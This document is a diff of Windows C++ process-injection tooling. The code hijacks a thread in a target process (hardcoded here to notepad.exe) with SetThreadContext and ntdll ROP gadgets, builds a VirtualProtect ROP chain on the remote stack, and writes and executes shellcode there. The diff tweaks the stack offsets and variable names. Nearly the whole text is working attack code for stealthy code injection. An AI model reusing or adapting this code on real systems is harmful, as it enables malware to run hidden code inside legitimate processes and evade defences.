@@ -210,7 +210,7 @@ bool ExecutePayload(HANDLE threadHandle, BYTE* remoteMemory)
 	}
 }
 
-bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
+bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
 {
 	if (SuspendThread(threadHandle) == -1)
 	{
@@ -242,7 +242,7 @@ bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endles
 	//.text:0000000180082741	retn
 	ctx.Rip = (DWORD_PTR)writeGadget;
 	ctx.Rbx = fakeStack;
-	ctx.R14 = (DWORD_PTR)endlessLoopGadget;
+	ctx.R14 = (DWORD_PTR)endlessLoop;
 
 	// - 0x28 to correct for add rsp, 0x20 and pop r14 in the gadget 
 	ctx.Rsp = fakeStack - 0x28;
@@ -253,7 +253,7 @@ bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endles
 	// 89 11	mov[ecx], edx; ret
 	ctx.Eip = (DWORD_PTR)writeGadget;
 	ctx.Ecx = fakeStack;
-	ctx.Edx = (DWORD_PTR)endlessLoopGadget;
+	ctx.Edx = (DWORD_PTR)endlessLoop;
 	ctx.Esp = fakeStack;
 #endif
 
@@ -263,7 +263,7 @@ bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endles
 		return false;
 	}
 
-	printf("[Info] - Writing loop gadget (%p) to fake stack (%p)", endlessLoopGadget, fakeStack);
+	printf("[Info] - Writing loop gadget (%p) to fake stack (%p)", endlessLoop, fakeStack);
 
 	if (ResumeThread(threadHandle) == -1)
 	{
@@ -277,13 +277,13 @@ bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endles
 		printf(".");
 		Sleep(50);
 		GetThreadContext(threadHandle, &ctx);
-	} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
+	} while (ctx.Xip != (DWORD_PTR)endlessLoop);
 
 	printf("done.\n");
 }
 
 #ifdef _WIN64
-DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
+DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
 {
 	CONTEXT ctx{};
 	ctx.ContextFlags = CONTEXT_ALL;
@@ -315,9 +315,10 @@ DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endle
 		ctx.Xip = (DWORD_PTR)writeGadget;
 
 		// the third entry in the ropchain is the target address for virtual protect
+		// we set this to the start of the shellcode on the stack
 		if (i == 3)
 		{
-			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp + 0x4a9;
+			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp - 0x2d0;
 		}
 
 		// the 10th entry in the ropchain is a writeable location for the old page protections
@@ -327,13 +328,14 @@ DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endle
 			virtualProtectRopChain64[i] = (DWORD_PTR)GetModuleHandleA("ntdll.dll") + 0x1645A0;
 		}
 
+		// the 14th entry in the ropchain is the address that VirtualProtect returns to after execution
+		// we set this to the start of the shellcode on the stack
 		if (i == 14)
 		{
-			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp + 0x4a9;
+			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp - 0x2d0;
 		}
 
 		ctx.R14 = (DWORD_PTR)((DWORD_PTR*)virtualProtectRopChain64)[i];
-
 		ctx.Rbx = (DWORD_PTR)ctx.Rsp - 0x368 + i * sizeof(void*); // 
 
 		// we need to store this since the gadget changes rbx
@@ -363,7 +365,7 @@ DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endle
 			printf(".");
 			Sleep(50);
 			GetThreadContext(threadHandle, &ctx);
-		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
+		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
 	}
 
 	printf("done.\n");
@@ -414,7 +416,7 @@ bool Execute64BitRopChain(HANDLE threadHandle)
 	return true;
 }
 #else
-DWORD_PTR Write32BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
+DWORD_PTR Write32BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
 {
 	CONTEXT ctx{};
 	ctx.ContextFlags = CONTEXT_ALL;
@@ -465,7 +467,7 @@ DWORD_PTR Write32BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endle
 			printf(".");
 			Sleep(50);
 			GetThreadContext(threadHandle, &ctx);
-		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
+		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
 	}
 
 	printf("done.\n");
@@ -517,12 +519,12 @@ bool Execute32BitRopChain(HANDLE threadHandle)
 #endif
 
 // the shellcode comes write after the ropchain, as the ROP chain makes the stack above (add esp) executable and jumps to execute
-bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoopGadget)
+bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoop)
 {
 	CONTEXT ctx{};
 	ctx.ContextFlags = CONTEXT_ALL;
 
-	printf("[Info] - Writing shellcode");
+	printf("[Info] - Writing shellcode to %p", remoteMemory);
 
 	for (int i = 0; i < sizeof(shellcode) / sizeof(void*) + 1; i++)
 	{
@@ -584,7 +586,7 @@ bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, 
 			printf(".");
 			Sleep(50);
 			GetThreadContext(threadHandle, &ctx);
-		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
+		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
 	}
 	printf("done.\n");
 	return true;
@@ -592,8 +594,8 @@ bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, 
 
 int main(int argc, char* argv[])
 {
-	const char* processName = "explorer.exe";
-
+	const char* processName = "notepad.exe";
+	/*
 #ifdef _WIN64
 	if (argc != 3)
 	{
@@ -602,11 +604,6 @@ int main(int argc, char* argv[])
 	}
 	useRopChain = atoi(argv[1]);
 	processName = argv[2];
-	if (useRopChain && strcmp(processName, "notepad.exe") != 0)
-	{
-		printf("[Error] - The current ROPchain can only be used with notepad.exe\n");
-		return 1;
-	}
 #else
 	if (argc != 2)
 	{
@@ -615,7 +612,7 @@ int main(int argc, char* argv[])
 	}
 	processName = argv[1];
 #endif
-
+*/
 	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	if (processesSnapshot == INVALID_HANDLE_VALUE)
 	{
@@ -650,8 +647,8 @@ int main(int argc, char* argv[])
 	}
 
 	// jmp	0x0
-	BYTE* endlessLoopGadget = FindBytePattern("ntdll.dll", "EB FE");
-	if (!endlessLoopGadget)
+	BYTE* endlessLoop = FindBytePattern("ntdll.dll", "EB FE");
+	if (!endlessLoop)
 	{
 		printf("[Error] - Failed to find infinit loop in ntdll\n");
 		return 1;
@@ -708,20 +705,15 @@ int main(int argc, char* argv[])
 				continue;
 			}
 
-			WriteLoopGadgetToStack(threadHandle, writeGadget, endlessLoopGadget);
+			WriteLoopGadgetToStack(threadHandle, writeGadget, endlessLoop);
 #ifdef _WIN64
 
 			if (useRopChain)
 			{
 				RebaseRopChain64();
-				DWORD_PTR executableStackStartAddress = Write64BitRopChain(threadHandle, writeGadget, endlessLoopGadget);
-				executableStackStartAddress += 0x18;	// skip shadowspace so our shellcode doesn't get overwritten
-
-				// harcoded delta between our shellcode address on the stack and rbp which does contain a stack address after our virtualalloc call
-				// this offset is valid for my current notepad.exe version. In calc the offset is different
-				executableStackStartAddress += 0x779;
-				executableStackStartAddress += 0x8;
-				WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoopGadget);
+				DWORD_PTR executableStackStartAddress = Write64BitRopChain(threadHandle, writeGadget, endlessLoop);
+				executableStackStartAddress += 0x20;	// skip shadowspace of VirtuaAlloc call so our shellcode doesn't get overwritten
+				WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoop);
 				Execute64BitRopChain(threadHandle);		
 			}
 			else
@@ -732,13 +724,13 @@ int main(int argc, char* argv[])
 					printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
 					return 1;
 				}
-				WriteShellcode(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoopGadget);
+				WriteShellcode(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoop);
 				ExecutePayload(threadHandle, (BYTE*)remoteMemory);
 			}	
 #else
 			RebaseRopChain();
-			DWORD_PTR executableStackStartAddress = Write32BitRopChain(threadHandle, writeGadget, endlessLoopGadget);
-			WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoopGadget);
+			DWORD_PTR executableStackStartAddress = Write32BitRopChain(threadHandle, writeGadget, endlessLoop);
+			WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoop);
 			Execute32BitRopChain(threadHandle);
 #endif
 
